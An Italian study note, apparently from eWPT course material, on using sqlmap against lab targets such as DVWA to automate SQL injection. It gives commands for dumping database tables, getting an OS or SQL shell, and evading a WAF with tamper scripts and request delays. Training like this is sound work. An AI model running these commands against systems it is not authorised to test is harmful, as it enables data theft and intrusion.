# SQLMap Automation

**Difficolta:** Intermediate
**Time to Master:** 2.5h
**Prerequisiti:** [06-Encoding-Bypasses.md](06-Encoding-Bypasses.md)
**Lab:** HTB / DVWA — pratica sqlmap

---

## Obiettivo

Usare sqlmap in modo efficace: non come "bacchetta magica" ma come acceleratore dopo aver gia confermato manualmente l'injection. In eWPT devi saper interpretare e guidare sqlmap, non solo lanciarlo.

---

## Concetti chiave

### Workflow corretto

1. Conferma l'injection manualmente (vedi file precedenti)
2. Usa sqlmap per automatizzare l'estrazione, non per scoprire la vulnerabilita da zero
3. Salva sempre la richiesta raw da Burp e passala a sqlmap con `-r` per massima precisione

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| sqlmap | `sqlmap -u URL --batch` | conferma + info DB | `--batch` = risposte default automatiche |

---

## Payload / Esempi

### Esempio 1: da richiesta Burp salvata a estrazione dati

```bash
# Step 1: salva la richiesta da Burp (right-click > Save item) come request.txt

# Step 2: test injection sul parametro
sqlmap -r request.txt -p id --batch

# Step 3: enumera database
sqlmap -r request.txt -p id --batch --dbs

# Step 4: enumera tabelle di un DB specifico
sqlmap -r request.txt -p id --batch -D nome_db --tables

# Step 5: dump di una tabella specifica
sqlmap -r request.txt -p id --batch -D nome_db -T users --dump
```

**Spiegazione:** usare `-r request.txt` (richiesta raw con cookie/header completi) e molto piu affidabile di ricostruire l'URL a mano — evita falsi negativi dovuti a sessione/token mancanti.

### Esempio 2: SQLi via POST body

```bash
sqlmap -u "http://target.com/login.php" --data "username=admin&password=test" -p username --batch
```

### Esempio 3: SQLi su header (es. cookie)

```bash
sqlmap -u "http://target.com/profile" --cookie="TrackingId=abc123*" --batch
```

**Spiegazione:** l'asterisco `*` indica a sqlmap il punto esatto di injection quando non e un parametro standard GET/POST.

### Esempio 4: forzare tecnica e DB engine specifici (piu veloce, meno rumoroso)

```bash
sqlmap -r request.txt -p id --batch --technique=BT --dbms=mysql
```

**Spiegazione:** se sai gia (da test manuale) che e blind boolean+time su MySQL, limitare `--technique` e `--dbms` velocizza drasticamente lo scan evitando tentativi inutili su altre tecniche/DB.

### Esempio 5: ottenere una shell dal DB (se privilegi sufficienti)

```bash
sqlmap -r request.txt -p id --batch --os-shell
sqlmap -r request.txt -p id --batch --sql-shell
```

---

## Evasion / Bypass Techniques

```bash
sqlmap -r request.txt -p id --batch --tamper=space2comment,between,charencode --random-agent --delay=1
```

| Flag | Uso |
|------|-----|
| `--tamper=` | applica trasformazioni per bypassare WAF |
| `--random-agent` | varia lo User-Agent per ogni richiesta |
| `--delay=N` | pausa tra richieste, riduce rilevabilita/rate-limit |
| `--level=5 --risk=3` | test piu approfonditi (piu lento, piu payload provati) |

---

## Lab Hands-On

### Lab 1: DVWA — SQL injection (low/medium/high)
**Obiettivo:** automatizzare estrazione dati su tutti i livelli di difficolta
**Difficulty:** Facile-Medio
**Time:** 1h

**Walkthrough breve:**
1. Cattura richiesta con Burp, salva come request.txt
2. Lancia sqlmap con `-r request.txt`
3. Alza `--level`/`--risk` sui livelli medium/high dove serve

---

## Common Mistakes

- Lanciare sqlmap direttamente su un URL senza sessione/cookie autenticato -> molte injection sono dietro login, serve `--cookie` o `-r` con richiesta autenticata completa
- Non forzare `--technique`/`--dbms` quando gia li conosci -> spreco di tempo e richieste
- Fidarsi ciecamente del risultato "not injectable" -> alza `--level` e `--risk` prima di escludere la vulnerabilita

---

## Link Utili

- [sqlmap GitHub Wiki](https://github.com/sqlmapproject/sqlmap/wiki)
- [sqlmap Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

---

## Connessioni

- **Prerequisito:** [06-Encoding-Bypasses.md](06-Encoding-Bypasses.md)
- **Prossimo Step:** [Lab-Challenges.md](Lab-Challenges.md)
- **Combinazione con:** [09-Tools-Reference/Automation-Scripts.md](../09-Tools-Reference/Automation-Scripts.md)

---

## Checklist di padronanza

- [ ] So passare una richiesta raw a sqlmap con -r
- [ ] So limitare tecnica/DB per velocizzare lo scan
- [ ] So enumerare DB/tabelle/colonne e fare dump mirato
- [ ] So usare tamper script per bypassare WAF

---

## Note personali

_(spazio libero)_
